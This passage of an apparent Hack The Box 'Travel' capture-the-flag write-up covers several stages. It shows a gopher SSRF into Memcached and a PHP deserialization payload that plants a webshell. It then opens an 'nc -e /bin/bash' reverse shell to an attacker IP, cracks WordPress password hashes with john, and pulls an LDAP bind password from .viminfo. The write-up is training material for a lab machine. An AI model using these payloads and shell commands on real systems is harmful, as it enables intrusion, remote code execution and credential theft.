",(0,r.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#payloads-with-localhost"},"PayloadsAllTheThings"),"."),(0,r.kt)("p",null,"If one didn't see the memcache URL it's still possible to bruteforce ports\nto check available services on localhost."),(0,r.kt)("p",null,"To create gopher payloads there is no better tool than ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/tarunkant/Gopherus"},"Gopherus"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ gopherus --exploit dmpmemcache\n$ gopherus --exploit phpmemcache\n")),(0,r.kt)("p",null,"With the first command we will be able to dump the Memcached content and with\nthe second one to execute a PHP payload."),(0,r.kt)("p",null,"Let's try some basic memcache commands found on ",(0,r.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting/11211-memcache#protocol-information"},"HackTricks"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ gopherus --exploit dmpmemcache\n\n\n  ________              .__\n /  _____/  ____ ______ |  |__   ___________ __ __  ______\n/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/\n\\    \\_\\  (  <_> )  |_> >   Y  \\  ___/|  | \\/  |  /\\___ \\\n \\______  /\\____/|   __/|___|  /\\___  >__|  |____//____  >\n        \\/       |__|        \\/     \\/                 \\/\n\n                author: $_SpyD3r_$\n\nGive payload you want to run in Memcached Server: version\n\nYour gopher link is ready to dump Memcache :\n\ngopher://127.0.0.1:11211/_%0d%0aversion%0d%0a\n\n-----------Made-by-SpyD3r----------\n")),(0,r.kt)("p",null,"Then we just have to replace ",(0,r.kt)("inlineCode",{parentName:"p"},"127.0.0.1")," by ",(0,r.kt)("inlineCode",{parentName:"p"},"LOCALHOST"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aversion%0d%0a\n")),(0,r.kt)("p",null,"This is maybe working but I don't think we will obtain an output so let's try\na RCE directly."),(0,r.kt)("p",null,"To get a RCE we have to know a Class where we can use deserialization,\nhopefully there is ",(0,r.kt)("inlineCode",{parentName:"p"},"TemplateHelper")," class in ",(0,r.kt)("inlineCode",{parentName:"p"},"template.php"),"."),(0,r.kt)("p",null,"Let's create a PoC for serialization:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n\nclass TemplateHelper\n{\n\n    private $file;\n    private $data;\n\n    public function __construct(string $file, string $data)\n    {\n        $this->init($file, $data);\n    }\n\n    public function __wakeup()\n    {\n        $this->init($this->file, $this->data);\n    }\n\n    private function init(string $file, string $data)\n    {\n        $this->file = $file;\n        $this->data = $data;\n        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);\n    }\n}\n\n$obj = new TemplateHelper(\"cyfun.php\",file_get_contents('shell.php'));\n$serialized = serialize($obj);\necho $serialized;\n")),(0,r.kt)("p",null,"With the class we will be able to write a file into the log folder.\nI wanted to write a php webshell with ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/epinna/weevely3"},"weevely")," but ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/epinna/weevely3"},"weevely")," generated shell\ncontains a lot of ",(0,r.kt)("inlineCode",{parentName:"p"},"@")," chars that are disabled. So I had to use a simpler\nwebshell, something like ",(0,r.kt)("a",{parentName:"p",href:"https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985"},"easy-simple-php-webshell.php"),"\nor ",(0,r.kt)("a",{parentName:"p",href:"https://gist.github.com/sente/4dbb2b7bdda2647ba80b"},"Simple-Backdoor-One-Liner.php"),"."),(0,r.kt)("p",null,"Then we can serialize it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},'$ php serialize.php 2>/dev/null | tr -d \'\\n\'\nO:14:"TemplateHelper":2:{s:20:"TemplateHelperfile";s:9:"cyfun.php";s:20:"TemplateHelperdata";s:113:"<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>";}\n')),(0,r.kt)("p",null,"Once encoded in the gopher payload:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"gopher://LOCALHOST:11211/_%0d%0aset%20SpyD3r%204%200%20216%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:113:%22%3C%3Fphp%20if%28isset%28%24_REQUEST%5B%27cmd%27%5D%29%29%7B%20echo%20%22%3Cpre%3E%22%3B%20%24cmd%20%3D%20%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20system%28%24cmd%29%3B%20echo%20%22%3C/pre%3E%22%3B%20die%3B%20%7D%3F%3E%22%3B%7D%0d%0a\n")),(0,r.kt)("p",null,"But where are stored the templates?\nThe theme is the default WordPress one, the css is located at\n",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-content/themes/twentytwenty/style.css"},"http://blog.travel.htb/wp-content/themes/twentytwenty/style.css"),"\nso the templates will be here too, eg. ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-content/themes/twentytwenty/template.php"},"http://blog.travel.htb/wp-content/themes/twentytwenty/template.php")),(0,r.kt)("p",null,"This mean that our webshell should be uploaded at ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php"},"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php"),"\nso our paylaod was not executed."),(0,r.kt)("p",null,"I think it's due to ",(0,r.kt)("a",{parentName:"p",href:"https://www.php.net/manual/en/function.escapeshellarg.php"},"escapeshellarg")," escaping\nthe quotes."),(0,r.kt)("p",null,"PS: the debug feature can also be accessed directly ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php"},"http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php")),(0,r.kt)("p",null,"So let's try with a shell not using quotes:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php system($_GET[1]); ?>\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ php serialize.php 2>/dev/null | tr -d \'\\n\'\nO:14:"TemplateHelper":2:{s:20:"TemplateHelperfile";s:9:"cyfun.php";s:20:"TemplateHelperdata";s:26:"<?php system($_GET[1]); ?>";}\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20128%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a\n")),(0,r.kt)("p",null,"Also Gopherus is hardcoding the key where it set the value to ",(0,r.kt)("inlineCode",{parentName:"p"},"SpyD3r")," (this must be the reason why). But this\nkey is never called so the deserialization is never triggered."),(0,r.kt)("p",null,"Let's get back to the line where the content is cached:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');\n")),(0,r.kt)("p",null,"The caching is done by ",(0,r.kt)("a",{parentName:"p",href:"https://simplepie.org/"},"simplepie")," with the function ",(0,r.kt)("a",{parentName:"p",href:"https://simplepie.org/wiki/reference/simplepie/set_cache_location"},"set_cache_location()"),".\nWe can also see there is a 60 second timeout so after that the cache may expire\nand the keys are prefixed with ",(0,r.kt)("inlineCode",{parentName:"p"},"xct_"),"."),(0,r.kt)("p",null,"If we search the ",(0,r.kt)("inlineCode",{parentName:"p"},"set_cache_location()")," function on the source hosted on github\nwe can see the function is calling the class method ",(0,r.kt)("inlineCode",{parentName:"p"},"cache_location"),"."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L901-L909"},"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L901-L909")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"    /**\n     * Set the file system location where the cached files should be stored\n     *\n     * @param string $location The file system location.\n     */\n    public function set_cache_location($location = './cache')\n    {\n        $this->cache_location = (string) $location;\n  }\n")),(0,r.kt)("p",null,"Searching for ",(0,r.kt)("inlineCode",{parentName:"p"},"cache_location")," I saw that both class\n",(0,r.kt)("inlineCode",{parentName:"p"},"SimplePie_Cache_Memcache")," (",(0,r.kt)("inlineCode",{parentName:"p"},"library/SimplePie/Cache/Memcache.php"),") and\n",(0,r.kt)("inlineCode",{parentName:"p"},"SimplePie_Cache_Memcached")," (",(0,r.kt)("inlineCode",{parentName:"p"},"/library/SimplePie/Cache/Memcached.php"),") are\nimplementing ",(0,r.kt)("inlineCode",{parentName:"p"},"SimplePie_Cache_Base")," interface (",(0,r.kt)("inlineCode",{parentName:"p"},"library/SimplePie/Cache/Base.php"),")."),(0,r.kt)("p",null,"Both are similar,\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99"},"https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"    /**\n     * Create a new cache object\n     * @param string $location Location string (from SimplePie::$cache_location)\n     * @param string $name     Unique ID for the cache\n     * @param string $type     Either TYPE_FEED for SimplePie data, or TYPE_IMAGE for image data\n     */\n    public function __construct($location, $name, $type) {\n        $this->options = array(\n            'host'   => '127.0.0.1',\n            'port'   => 11211,\n            'extras' => array(\n                'timeout' => 3600, // one hour\n                'prefix'  => 'simplepie_',\n            ),\n        );\n        $this->options = SimplePie_Misc::array_merge_recursive($this->options, SimplePie_Cache::parse_URL($location));\n\n        $this->name = $this->options['extras']['prefix'] . md5(\"$name:$type\");\n\n        $this->cache = new Memcached();\n        $this->cache->addServer($this->options['host'], (int)$this->options['port']);\n    }\n")),(0,r.kt)("p",null,"The extra options timeout & prefix will be overriden by the ones we saw in\nthe template. Then the key is the concatenation of\nthe prefix ",(0,r.kt)("inlineCode",{parentName:"p"},"xct_")," + the md5 of the name (unique id), colon & type (TYPE_FEED).\nIn ",(0,r.kt)("inlineCode",{parentName:"p"},"library/SimplePie/Cache/Base.php")," we can see that ",(0,r.kt)("inlineCode",{parentName:"p"},"TYPE_FEED = 'spc'"),"."),(0,r.kt)("p",null,"So we have something like that ",(0,r.kt)("inlineCode",{parentName:"p"},'xct_ + MD5( UNIQUE_ID? ":spc")')," but we still need\nto determine how ",(0,r.kt)("inlineCode",{parentName:"p"},"UNIQUE_ID")," is generated."),(0,r.kt)("p",null,"For that we have to look at the main class (in ",(0,r.kt)("inlineCode",{parentName:"p"},"library/SimplePie.php"),") when\nSimplePie is initialized (",(0,r.kt)("inlineCode",{parentName:"p"},"$simplepie->init();"),")."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"set_cache_name_function")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1117-L1128"},"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1117-L1128")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"    /**\n     * Set callback function to create cache filename with\n     *\n     * @param mixed $function Callback function\n     */\n    public function set_cache_name_function($function = 'md5')\n    {\n        if (is_callable($function))\n        {\n            $this->cache_name_function = $function;\n        }\n  }\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L535-L540"},"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L535-L540")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"    /**\n     * @var string Function that creates the cache filename\n     * @see SimplePie::set_cache_name_function()\n     * @access private\n     */\n    public $cache_name_function = 'md5';\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1377"},"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1377")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"        $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1714"},"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1714")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"          $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $file->url), 'spc'));\n")),(0,r.kt)("p",null,"So what I called the ",(0,r.kt)("inlineCode",{parentName:"p"},"UNIQUE_ID")," is generated like this ",(0,r.kt)("inlineCode",{parentName:"p"},"md5($url)"),"."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1376"},"https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1376")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"                $url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"$url")," is the ",(0,r.kt)("inlineCode",{parentName:"p"},"feed_url"),"."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},'"xct_" + MD5( MD5(feed_url) + ":spc")')),(0,r.kt)("p",null,"So now which URL do we want to poison? We are forced to make it in two steps.\nBecause poisoning the URL we are attacking with is impossible as we need\nthe hash of the URL but the URL contains the cache that is forged with the\nURL hash, so it's recursive.\nElse we have to poison an arbitrary URL that we can compute in advance.\nIn the template code if no ",(0,r.kt)("inlineCode",{parentName:"p"},"custom_feed_url")," is provided, the default one\n",(0,r.kt)("a",{parentName:"p",href:"http://www.travel.htb/newsfeed/customfeed.xml"},"http://www.travel.htb/newsfeed/customfeed.xml")," is used instead.\nWe can compute it like that:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ printf %s \"$(printf %s 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum | cut -d ' ' -f 1):spc\" | md5sum | cut -d ' ' -f 1\n4e5612ba079c530a6b1f148c0b352241\n")),(0,r.kt)("p",null,"The cache key is ",(0,r.kt)("inlineCode",{parentName:"p"},"xct_4e5612ba079c530a6b1f148c0b352241"),"."),(0,r.kt)("p",null,"So now here is the two steps attack:"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Poison the cache with the with our gopher request"),(0,r.kt)("li",{parentName:"ol"},"Call ",(0,r.kt)("a",{parentName:"li",href:"http://blog.travel.htb/awesome-rss/"},"http://blog.travel.htb/awesome-rss/")," without custom feed to trigger the cache (within 60 seconds)")),(0,r.kt)("p",null,"That will result in our shell being written to the server."),(0,r.kt)("p",null,"We have to replace ",(0,r.kt)("inlineCode",{parentName:"p"},"SpyD3r")," with ",(0,r.kt)("inlineCode",{parentName:"p"},"xct_4e5612ba079c530a6b1f148c0b352241"),"."),(0,r.kt)("p",null,"Also we have to understand the ",(0,r.kt)("a",{parentName:"p",href:"https://www.tutorialspoint.com/memcached/memcached_set_data.htm"},"Memcached - Set Data")," structure"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"set key flags exptime bytes [noreply]\nvalue\n")),(0,r.kt)("p",null,"By default gopherus set the following:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"flags: 4 (an arbitrary integer)"),(0,r.kt)("li",{parentName:"ul"},"exptime: 0 (no expiration)"),(0,r.kt)("li",{parentName:"ul"},"bytes: 128 (size in bytes of the data block)")),(0,r.kt)("p",null,"That seems good. Also earlier I was copy-pasting the serialized payload into gopherus\nso some unprintable characters were missing. The proper solution is to directly pipe\nthe output into it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ php serialize.php 2>/dev/null | gopherus --exploit phpmemcache\n\n\n  ________              .__\n /  _____/  ____ ______ |  |__   ___________ __ __  ______\n/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/\n\\    \\_\\  (  <_> )  |_> >   Y  \\  ___/|  | \\/  |  /\\___ \\\n \\______  /\\____/|   __/|___|  /\\___  >__|  |____//____  >\n        \\/       |__|        \\/     \\/                 \\/\n\n                author: $_SpyD3r_$\n\n\nThis is usable when you know Class and Variable name used by user\n\nGive serialization payload\nexample: O:5:"Hello":0:{}   :\nYour gopher link is ready to do SSRF :\n\ngopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20132%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22%00TemplateHelper%00file%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22%00TemplateHelper%00data%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a\n\nAfter everything done, you can delete memcached item by using this payload:\n\ngopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a\n\n-----------Made-by-SpyD3r-----------\n')),(0,r.kt)("p",null,"Then we just have to run the two steps."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ curl 'http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20132%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22%00TemplateHelper%00file%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22%00TemplateHelper%00data%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a'\n\n$ curl http://blog.travel.htb/awesome-rss/\n")),(0,r.kt)("p",null,"And ",(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php"},"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php")," is\navailable."),(0,r.kt)("p",null,"Then we have 60 seconds to do something like getting a reverse shell, eg."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php?1=nc%20-e%20/bin/bash%2010.10.14.66%209999"},"http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php?1=nc%20-e%20/bin/bash%2010.10.14.66%209999")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.189:47498 (family 2/IPv4, TCP)\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-www-data-to-lynik-admin"},"Privilege Escalation of Machine : from www-data to lynik-admin"),(0,r.kt)("p",null,"There is a SQL backup in the wordpress directory."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ls -lhA /opt/wordpress\ntotal 1.2M\n-rw-r--r-- 1 root root 1.2M Apr 24 06:39 backup-13-04-2020.sql\n")),(0,r.kt)("p",null,"Let's look for the user creation:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /opt/wordpress/backup-13-04-2020.sql | grep 'INSERT INTO `wp_users`'\nINSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');\n")),(0,r.kt)("p",null,"Then we can run  to find the hash type:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ haiti '$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'\nWordpress \u2265 v2.6.2 [HC: 400] [JtR: phpass]\nJoomla \u2265 v2.5.18 [HC: 400] [JtR: phpass]\nPHPass' Portable Hash [HC: 400] [JtR: phpass]\n")),(0,r.kt)("p",null,"Then let's start cracking with ",(0,r.kt)("a",{parentName:"p",href:"https://www.openwall.com/john/"},"john"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ john --format=phpass hashes.txt -w=/usr/share/wordlists/passwords/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\nCost 1 (iteration count) is 8192 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1stepcloser      (?)\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"lynik-admin")," / ",(0,r.kt)("inlineCode",{parentName:"p"},"1stepcloser")),(0,r.kt)("p",null,"The we can log in via ssh:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ssh lynik-admin@travel.htb\nlynik-admin@travel:~$ id\nuid=1001(lynik-admin) gid=1001(lynik-admin) groups=1001(lynik-admin)\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-lynik-admin-to-root"},"Privilege Escalation of Machine : from lynik-admin to root"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"lynik-admin@travel:~$ ls -lhA\ntotal 32K\nlrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -> /dev/null\n-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 lynik-admin lynik-admin 3.7K Feb 25  2020 .bashrc\ndrwx------ 2 lynik-admin lynik-admin 4.0K Apr 23 19:34 .cache\ndrwx------ 4 lynik-admin lynik-admin 4.0K Sep  9 05:48 .gnupg\n-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc\n-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25  2020 .profile\n-r--r--r-- 1 root        root          33 Sep  9 04:56 user.txt\n-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo\n")),(0,r.kt)("p",null,"We can see a ",(0,r.kt)("inlineCode",{parentName:"p"},".viminfo")," file and a ",(0,r.kt)("inlineCode",{parentName:"p"},".ldaprc")," file."),(0,r.kt)("p",null,"Some lines in ",(0,r.kt)("inlineCode",{parentName:"p"},".viminfo")," are interesting:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'# Registers:\n""1     LINE    0\n        BINDPW Theroadlesstraveled\n|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"\n\n# File marks:\n\'0  3  0  ~/.ldaprc\n|4,48,3,0,1587670530,"~/.ldaprc"\n\n# Jumplist (newest first):\n-\'  3  0  ~/.ldaprc\n|4,39,3,0,1587670530,"~/.ldaprc"\n-\'  1  0  ~/.ldaprc\n|4,39,1,0,1587670527,"~/.ldaprc"\n\n# History of marks within files (newest to oldest):\n\n> ~/.ldaprc\n        *       1587670529      0\n        "       3       0\n        .       4       0\n        +       4       0\n')),(0,r.kt)("p",null,"In the ",(0,r.kt)("inlineCode",{parentName:"p"},".ldaprc")," too:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"HOST ldap.travel.htb\nBASE dc=travel,dc=htb\nBINDDN cn=lynik-admin,dc=travel,dc=htb\n")),(0,r.kt)("p",null,"With the password and information we can make a request binding to the rootDN:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ldapsearch -H ldap://ldap.travel.htb -x -D 'cn=lynik-admin,dc=travel,dc=htb' -w Theroadlesstraveled\n# extended LDIF\n#\n# LDAPv3\n# base <dc=travel,dc=htb> (default) with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# travel.htb\ndn: dc=travel,dc=htb\nobjectClass: top\nobjectClass: dcObject\nobjectClass: organization\no: Travel.HTB\ndc: travel\n\n# admin, travel.htb\ndn: cn=admin,dc=travel,dc=htb\nobjectClass: simpleSecurityObject\nobjectClass: organizationalRole\ncn: admin\ndescription: LDAP administrator\n\n# servers, travel.htb\ndn: ou=servers,dc=travel,dc=htb\ndescription: Servers\nobjectClass: organizationalUnit\nou: servers\n\n# lynik-admin, travel.htb\ndn: cn=lynik-admin,dc=travel,dc=htb\ndescription: LDAP administrator\nobjectClass: simpleSecurityObject\nobjectClass: organizationalRole\ncn: lynik-admin\nuserPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=\n =\n\n# workstations, travel.htb\ndn: ou=workstations,dc=travel,dc=htb\ndescription: Workstations\nobjectClass: organizationalUnit\nou: workstations\n\n# linux, servers, travel.htb\ndn: ou=linux,ou=servers,dc=travel,dc=htb\ndescription: Linux Servers\nobjectClass: organizationalUnit\nou: linux\n\n# windows, servers, travel.htb\ndn: ou=windows,ou=servers,dc=travel,dc=htb\ndescription: Windows Servers\nobjectClass: organizationalUnit\nou: windows\n\n# users, linux, servers, travel.htb\ndn: ou=users,ou=linux,ou=servers,dc=travel,dc=htb\ndescription: Linux Users\nobjectClass: organizationalUnit\nou: users\n\n# groups, linux, servers, travel.htb\ndn: ou=groups,ou=linux,ou=servers,dc=travel,dc=htb\ndescription: Linux Groups\nobjectClass: organizationalUnit\nou: groups\n\n# jane, users, linux, servers, travel.htb\ndn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: jane\ncn: Jane Rodriguez\nsn: Rodriguez\ngivenName: Jane\nloginShell: /bin/bash\nuidNumber: 5005\ngidNumber: 5000\nhomeDirectory: /home/jane\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\n\n# brian, users, linux, servers, travel.htb\ndn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: brian\ncn: Brian Bell\nsn: Bell\ngivenName: Brian\nloginShell: /bin/bash\nuidNumber: 5002\ngidNumber: 5000\nhomeDirectory: /home/brian\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\n\n# frank, users, linux, servers, travel.htb\ndn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: frank\ncn: Frank Stewart\nsn: Stewart\ngivenName: Frank\nloginShell: /bin/bash\nuidNumber: 5001\ngidNumber: 5000\nhomeDirectory: /home/frank\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\n\n# jerry, users, linux, servers, travel.htb\ndn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: jerry\nuidNumber: 5006\nhomeDirectory: /home/jerry\ngivenName: Jerry\ngidNumber: 5000\nsn: Morgan\ncn: Jerry Morgan\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\nloginShell: /bin/bash\n\n# lynik, users, linux, servers, travel.htb\ndn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: lynik\nuidNumber: 5000\nhomeDirectory: /home/lynik\ngivenName: Lynik\ngidNumber: 5000\nsn: Schmidt\ncn: Lynik Schmidt\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\nloginShell: /bin/bash\n\n# edward, users, linux, servers, travel.htb\ndn: uid=edward,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: edward\nuidNumber: 5009\nhomeDirectory: /home/edward\ngivenName: Edward\ngidNumber: 5000\nsn: Roberts\ncn: Edward Roberts\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: inetOrgPerson\nobjectClass: posixAccount\nobjectClass: shadowAccount\nloginShell: /bin/bash\n\n# eugene, users, linux, servers, travel.htb\ndn: uid=eugene,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\nuid: eugene\ncn: Eugene Scott\nsn: Scott\ngivenName: Eugene\nloginShell: /bin/bash\nuidNumber: 5008\ngidNumber: 